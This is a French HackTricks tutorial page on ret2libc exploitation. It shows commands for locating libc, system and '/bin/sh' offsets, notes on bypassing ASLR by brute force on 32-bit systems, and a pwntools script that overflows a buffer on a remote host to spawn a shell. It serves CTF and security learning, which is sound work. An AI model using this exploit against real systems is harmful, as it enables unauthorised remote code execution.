# Ret2lib

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informations de base**

L'essence de **Ret2Libc** est de rediriger le flux d'ex√©cution d'un programme vuln√©rable vers une fonction d'une biblioth√®que partag√©e (par exemple, **system**, **execve**, **strcpy**) au lieu d'ex√©cuter un shellcode fourni par l'attaquant sur la pile. L'attaquant cr√©e une charge utile qui modifie l'adresse de retour sur la pile pour pointer vers la fonction de biblioth√®que souhait√©e, tout en veillant √† ce que les arguments n√©cessaires soient correctement configur√©s selon la convention d'appel.

### **√âtapes d'exemple (simplifi√©es)**

* Obtenir l'adresse de la fonction √† appeler (par exemple, system) et la commande √† appeler (par exemple, /bin/sh)
* G√©n√©rer une cha√Æne ROP pour passer le premier argument pointant vers la cha√Æne de commande et le flux d'ex√©cution vers la fonction

## Trouver les adresses

* En supposant que la `libc` utilis√©e est celle de la machine actuelle, vous pouvez trouver o√π elle sera charg√©e en m√©moire avec :

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Si vous voulez v√©rifier si l'ASLR change l'adresse de la libc, vous pouvez faire :
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* En connaissant la libc utilis√©e, il est √©galement possible de trouver le d√©calage de la fonction `system` avec :
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* En connaissant la libc utilis√©e, il est √©galement possible de trouver le d√©calage de la fonction de la cha√Æne `/bin/sh` avec :
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Utilisation de gdb-peda / GEF

En connaissant la libc utilis√©e, il est √©galement possible d'utiliser Peda ou GEF pour obtenir l'adresse de la fonction **system**, de la fonction **exit** et de la cha√Æne **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Utilisation de /proc/\<PID>/maps

Si le processus cr√©e des **enfants** √† chaque fois que vous communiquez avec lui (serveur r√©seau), essayez de **lire** ce fichier (vous devrez probablement √™tre root).

Ici, vous pouvez trouver **exactement o√π la libc est charg√©e** √† l'int√©rieur du processus et **o√π elle va √™tre charg√©e** pour chaque enfant du processus.

![](<../../../.gitbook/assets/image (850).png>)

Dans ce cas, elle est charg√©e √† **0xb75dc000** (ce sera l'adresse de base de la libc)

## Libc inconnue

Il est possible que vous **ne connaissiez pas la libc charg√©e par le binaire** (car elle pourrait √™tre situ√©e sur un serveur auquel vous n'avez pas acc√®s). Dans ce cas, vous pourriez exploiter la vuln√©rabilit√© pour **d√©voiler certaines adresses et trouver quelle biblioth√®que libc** est utilis√©e :

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Et vous pouvez trouver un mod√®le pwntools pour cela dans :

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Conna√Ætre la libc avec 2 offsets

Consultez la page [https://libc.blukat.me/](https://libc.blukat.me/) et utilisez **quelques adresses** de fonctions √† l'int√©rieur de la libc pour d√©couvrir la **version utilis√©e**.

## Contourner l'ASLR en 32 bits

Ces attaques par force brute ne sont **utiles que pour les syst√®mes 32 bits**.

* Si l'exploit est local, vous pouvez essayer de forcer l'adresse de base de la libc (utile pour les syst√®mes 32 bits) :
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Lors d'une attaque sur un serveur distant, vous pourriez essayer de **forcer l'adresse de la fonction `usleep` de la `libc`**, en passant 10 comme argument. Si √† un moment le **serveur met 10 secondes de plus √† r√©pondre**, vous avez trouv√© l'adresse de cette fonction.

## One Gadget

Ex√©cutez un shell en sautant simplement √† une adresse sp√©cifique dans la libc :

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Exemple de code x86 Ret2lib

Dans cet exemple, le brute-force ASLR est int√©gr√© dans le code et le binaire vuln√©rable est situ√© sur un serveur distant :
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Exemple de code x64 Ret2lib

Consultez l'exemple √† partir de:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Ret-into-printf (ou puts)

Cela permet de **fuite d'informations du processus** en appelant `printf`/`puts` avec des donn√©es sp√©cifiques plac√©es en tant qu'argument.

## Ret2printf

Cela signifie essentiellement abuser d'un **Ret2lib pour le transformer en une vuln√©rabilit√© de cha√Ænes de format `printf`** en utilisant le `ret2lib` pour appeler printf avec les valeurs √† exploiter (semble inutile mais possible):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Autres exemples et r√©f√©rences

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, en donnant une fuite √† l'adresse d'une fonction dans libc, en utilisant un gadget unique
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bits, ASLR activ√© mais pas de PIE, la premi√®re √©tape est de remplir un d√©passement jusqu'au byte 0x00 du canary pour ensuite appeler puts et le fuiter. Avec le canary, un gadget ROP est cr√©√© pour appeler puts et fuiter l'adresse de puts depuis le GOT, puis un gadget ROP pour appeler `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR activ√©, pas de canary, d√©bordement de pile dans main √† partir d'une fonction enfant. Gadget ROP pour appeler puts et fuiter l'adresse de puts depuis le GOT, puis appeler un gadget unique.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bits, pas de PIE, pas de canary, pas de relro, nx. Utilise la fonction write pour fuiter l'adresse de write (libc) et appelle un gadget unique.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Utilise une cha√Æne de format pour fuiter le canary depuis la pile et un d√©passement de tampon pour appeler system (il est dans le GOT) avec l'adresse de `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bits, pas de relro, pas de canary, nx, pie. Abuser d'un mauvais indexage pour fuiter des adresses de libc et du tas depuis la pile. Abuser du d√©passement de tampon pour faire un ret2lib en appelant `system('/bin/sh')` (l'adresse du tas est n√©cessaire pour contourner une v√©rification).
